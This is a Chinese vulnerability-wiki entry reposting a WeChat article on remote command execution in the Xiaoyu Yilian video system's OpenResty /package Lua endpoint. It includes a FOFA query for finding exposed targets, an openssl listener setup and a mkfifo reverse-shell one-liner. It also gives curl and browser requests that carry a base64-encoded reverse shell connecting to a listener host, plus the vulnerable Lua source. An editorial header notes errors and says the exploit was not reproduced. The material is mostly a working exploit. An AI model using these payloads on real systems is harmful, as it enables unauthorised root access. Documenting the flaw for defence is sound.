---
fofa: "title=\"云视讯管理平台\""
source: "MrWQ/vulnerability-paper"
title: "小鱼易连视频系统 - Nginx LUA 脚本远程命令执行"
product: "小鱼易连视频系统自带OpenResty package.lua（非NGINX通用漏洞）"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "暴露自定义/package入口、缺鉴权与输入约束，权限取决于OpenResty容器用户"
source_url: "https://mp.weixin.qq.com/s/iCHikHfJZBjNYr-950gKJA"
source_status: "recorded"
side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
id: "vw-4e9f8cc6e2fee5d613b2dc07"
entity_id: "ve-4e9f8cc6e2fee5d613b2dc07"
schema_version: "1"
---

# 小鱼易连视频系统 - Nginx LUA 脚本远程命令执行

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：暴露自定义/package入口、缺鉴权与输入约束，权限取决于OpenResty容器用户
- 证据范围：给出真实Lua sink有独立分析价值，但两种演示命令存在执行位置/语法问题，应重分类到小鱼易连产品。

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。
- 从本文明确展示的查询恢复完整 FOFA 元数据；资产指纹只用于识别，不是漏洞命中证据。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- curl双引号内反引号会先由本地shell执行，可能在攻击机执行反弹命令，不能证明请求携带了远端载荷
- 浏览器例子去掉反引号并保留空格管道，与curl不等价；rawURL编码/命令闭合未说明
- 将Base64称加密，FIFO命令解释把管道与证书文件/连接地址混淆
- 代码中可控path拼进tar，不是拼进rm -rf（后者固定日志文件路径），根因表述错
- root为容器进程身份，不等于宿主/k8s集群root；docker ps不能证明属于k8s
- 版本/补丁全无，公网大多已修复无证据；fofa元数据抽成大法而正文完整
- Base64原文字面量已读未解码执行，广告噪声大量

### 操作风险与资料使用

- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/iCHikHfJZBjNYr-950gKJA)

**上来就 fofa 大法：**

```
title="云视讯管理平台"
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/nMQkaGYuOibDUjWrXBH3Xhbjxlew2fjJ7ib4OLKn1NhRxNcXalnZIUEa7c6AghnOTPuVDKswD2SsR1YRDytacO3Q/640?wx_fmt=jpeg)

找到页面了之后寻找该该系统的 OpenReaty 页面，一般都在其他端口上。  

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDUjWrXBH3Xhbjxlew2fjJ7ToruG4lFXhUFBauTDIjDv4gRt7muLEFcTkbGKyuXvn8ibG8PtHzsMNw/640?wx_fmt=png)

**漏洞特征：**

**通过访问 “/package?path=`Liunx 命令 `” 可直接构造远程代码执行。**

**漏洞原理：**

**“小鱼易连视频会议系统”LUA 脚本权限分配不当, 导致任意用户可利用 root 权限执行命令**

**复现全过程：**

本地进行 openssl 监听：

1、生成证书：

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

2、进行监听：

```
openssl s_server -quiet -key key.pem -cert cert.pem -port 443
```

3、构造反弹 shell 命令

```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <IP>:<PORT> > /tmp/s; rm /tmp/s
```

```
命令解释：
1.mkfifo是创建一个命名管道，创建好了以后/tmp/s内容是空的
2.然后不断执行那个bash反弹的命令，连接的地址从步骤1的文件里取
3.找那个443连接往步骤1里的文件写入内容，估计是ip和端口
4.最后shell弹好了就删除步骤1的文件
```

4、构造 “package?path=” 路径下命令执行语句，将上面反弹 shell 命令进行 base64 加密。

开始攻击：

1、请求目机机器上执行命令有三种方法：

```
curl：curl "http://ip/package?path=`echo bWtmaWZvIC90bXAvczsvYmluL2Jhc2ggLWkgPCAvdG1wL3MgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMC42Mi45Ni4yMzY6ODg4ID4gL3RtcC9zO3JtIC1mIC90bXAvcw== | base64 -d | sh`"
```

2、直接 web 上面请求：

```
http://ip/package?path=echo bWtmaWZvIC90bXAvczsvYmluL2Jhc2ggLWkgPCAvdG1wL3MgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMC42Mi45Ni4yMzY6ODg4ID4gL3RtcC9zO3JtIC1mIC90bXAvcw== | base64 -d | sh
```

3、burp 抓包拦截请求，同 web 一样。

bp 抓上面的请求会返回 302，然后跳转 404, 不要慌，这时候去看你的监听服务器

监听服务器返回 shell，直接 root 权限

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDUjWrXBH3Xhbjxlew2fjJ7InhqUruF4casAqib5wY2hI5IEicaicibolf8EGMs4ox6TKsvfDC2U4L12Q/640?wx_fmt=png)

接下来详细分析：  

找机器来验证，环境为 docker，上机查看：

```
netstat -anvp | grep :80
```

返回结果如下：

```
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      16554/nginx: mas
```

运行在 80 端口的程序为 nginx，在宿主机中寻找 nginx 程序

```
find / -name nginx
```

发现宿主机中没有运行 nginx

于是尝试进入 k8s 中的容器寻找响应服务

```shell
docker ps | grep openresty
```

结果如下：  

```
b61e91356e49    "/usr/local/openresty"
```

最终在 k8s 中的 openresty 容器中发现了 nginx 程序 /usr/local/openresty/nginx，查询 nginx 配置文件，发现配置文件当中引用了一行 lua 脚本：

```
location = /package {
                proxy_set_header Host $host:$server_port;
                proxy_set_header X-Real-IP $remote_addr;
                proxy_set_header X-Nginx-IP $server_addr;
                limit_req zone=normalfrequ burst=20 nodelay;
                content_by_lua_file lua/package.lua;
          }
```

查询该文件并查看文件内容 cat /usr/local/openresty/nginx/lua/package.lua

```
local package_absolute_path = '/var/log/logs.tar.gz'
local path = ngx.req.get_uri_args().path
if nil == path then
    path = '/logs'
end

os.execute('rm -rf ' .. package_absolute_path)
os.execute('tar -zcvPf ' .. package_absolute_path .. ' ' .. path)
ngx.redirect('/log/logs.tar.gz?' .. os.time())
print('rm -rf ' .. package_absolute_path)
os.execute('rm -rf ' .. package_absolute_path)
return
```

仔细研究发现在配置文件中直接对 path 参数传入的字符串与 rm -rf 等命令进行拼接，没有进行文件白名单等过滤，攻击者可以通过构造特殊字符串对命令进行闭合，从而造成 Linux 命令注入，公网大多已修复后才进行爆出。

谨记网络安全法，切勿用于非法用途

公众号

最后再给大家介绍一下漏洞库，地址：wiki.xypbk.com  

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibAMOicC5b9zVDyfybStngExBMSTicgTjNIOd4cSIroia7ae82ZJvdibclGltrgjdJLzugk276Q9xkonYw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibAMOicC5b9zVDyfybStngExBn4bcIUDNGtN3mHLSSNiabKm9LPwxmb4qeq5Jbk6COGnLbgr5Rt2POmA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibAMOicC5b9zVDyfybStngExBkevFiamAkVDFhgFopA50dnUI98AAo6nXuuTC5DpeKS6BneWtTpWu7ew/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibAMOicC5b9zVDyfybStngExBx4lpIiahQIj3G9Y3cpiaaqLFIN5EtlrDlkb1Sqnm40wtVYcWof1bSOXw/640?wx_fmt=png)

本站暂不开源，因为想控制影响范围，若因某些人乱搞，造成了严重后果，本站将即刻关闭。

漏洞库内容来源于互联网 && 零组文库 &&peiqi 文库 && 自挖漏洞 && 乐于分享的师傅，供大家方便检索，绝无任何利益。  

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。

若有愿意分享自挖漏洞的佬师傅请公众号后台留言，本站将把您供上，并在此署名，天天烧香那种！

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/nMQkaGYuOibDavXvuud5F09Tjl7NMvU8Yzhia63knJ4QJFvO4WBfd6KQazjtuPC7uqNBt5gE06ia7GjOVn2RFOicNA/640?wx_fmt=jpeg)

扫取二维码获取

更多精彩

![](https://mmbiz.qpic.cn/mmbiz_png/TlgiajQKAFPtOYY6tXbF7PrWicaKzENbNF71FLc4vO5nrH2oxBYwErfAHKg2fD520niaCfYbRnPU6teczcpiaH5DKA/640?wx_fmt=png)

Qingy 之安全  

![](https://mmbiz.qpic.cn/mmbiz_png/Y8TRQVNlpCW6icC4vu5Pl5JWXPyWdYvGAyfVstVJJvibaT4gWn3Mc0yqMQtWpmzrxibqciazAr5Yuibwib5wILBINfuQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3pKe8enqDsSibzOy1GzZBhppv9xkibfYXeOiaiaA8qRV6QNITSsAebXibwSVQnwRib6a2T4M8Xfn3MTwTv1PNnsWKoaw/640?wx_fmt=png)

点个在看你最好看

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
